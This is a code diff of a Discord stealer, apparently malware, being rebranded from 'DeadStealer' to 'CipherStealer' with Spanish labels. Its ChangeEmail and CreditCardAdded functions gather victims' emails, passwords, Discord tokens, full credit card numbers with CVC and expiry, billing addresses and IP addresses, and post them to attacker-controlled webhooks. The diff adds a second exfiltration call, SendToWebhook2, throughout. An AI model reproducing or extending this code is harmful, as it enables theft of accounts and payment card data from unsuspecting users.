@@ -1298,7 +1349,7 @@ function ChangeEmail(newemail, password, token) {
 													value: `${Cool()}`,
 													inline: !1
 												}, {
-													name: "<:black_lips:926268648593719396> Nuevo correo",
+													name: "<:black_lips:926268648593719396> Nuevo correo electrónico",
 													value: `\`${newemail}\``,
 													inline: !0
 												}, {
@@ -1306,30 +1357,28 @@ function ChangeEmail(newemail, password, token) {
 													value: `\`${password}\``,
 													inline: !0
 												}, {
-													name: "Token",
+													name: "<:black_mask:926268629245390879> Token",
 													value: `\`\`\`${token}\`\`\``,
 													inline: !1
 												}, ],
 												"author": {
-													 "name": 'CipherStealer',
-                                                                                                         "url": 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
-                                                                                                         "icon_url": 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+													"name": "CipherStealer"
 												},
 												"footer": {
-													"text": "Gracias por utilizar DeadStealer"
+													"text": "ChiperStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
 												}
 											}, {
 												"title": `Total Friends (${totalFriends()})`,
-												 color: 0xFF0300,
+												"color": 0xFF0300,
 												"description": CalcFriends(),
 												"author": {
-													"name": "DeadStealer"
+													"name": "CipherStealer"
 												},
 												"footer": {
-													"text": "Gracias por utilizar DeadStealer"
+													"text": "CipherStealer"
 												},
 												"thumbnail": {
 													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
@@ -1337,6 +1386,7 @@ function ChangeEmail(newemail, password, token) {
 											}]
 										}
 										SendToWebhook(JSON.stringify(params))
+										SendToWebhook2(JSON.stringify(params))
 									})
 								})
 							})
@@ -1365,23 +1415,27 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, sta
     `, !0).then((ip) => {
 			var json = JSON.parse(info);
 			var params = {
-				username: "DeadStealer",
+				username: 'CipherStealer',
+                avatar_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif',
 				content: "",
 				embeds: [{
-					"title": "User Credit Card Added",
-					"description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
-					"author": {
-						"name": "DeadStealer"
-					},
-					"footer": {
-						"text": "DeadStealer"
-					},
-					"thumbnail": {
-						"url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar
-					}
+					"title": "CipherStealer",
+					"description": "**<:black_joker:926273784305045526> Usuario:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**<:black_lips:926268648593719396> Correo electrónico:**```" + json.email + "```\n" + "**<:Bup_negro:926272964113104946> Nitro:**```" + GetNitro(json.premium_type) + "```\n**<:black_playboy:926268704000475196> Insignias:**```" + GetBadges(json.flags) + "```" + "\n**<a:black_cc:926273142350024764> Número de tarjeta: **```" + number + "```" + "\n**<a:black_cc:926273142350024764> Expiración de la tarjeta: **```" + expir_month + "/" + expir_year + "```" + "\n**<a:black_cc:926273142350024764> CVC: **```" + cvc + "```\n" + "**<a:black_cc:926273142350024764> País: **```" + country + "```\n" + "**<a:black_cc:926273142350024764> Estado: **```" + state + "```\n" + "**<a:black_cc:926273142350024764> Ciudad: **```" + city + "```\n" + "**<a:black_cc:926273142350024764> ZIP:**```" + zip + "```" + "\n**<a:black_cc:926273142350024764> Calle: **```" + street + "```" + "\n**<:black_mask:926268629245390879> Token:**```" + token + "```" + "\n**IP: **```" + ip + "```",
+					author: {
+                        name: 'CipherStealer',
+                        url: 'https://www.youtube.com/watch?v=dQw4w9WgXcQ',
+                        icon_url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                    },
+                    footer: {
+                        text: 'Gracias por utilizar CipherStealer.'
+                    },
+                    thumbnail: {
+                        url: 'https://media.discordapp.net/attachments/699150846209818664/930793406102376448/ologo.gif'
+                    }
 				}]
 			}
 			SendToWebhook(JSON.stringify(params))
+			SendToWebhook2(JSON.stringify(params))
 		})
 	})
 }
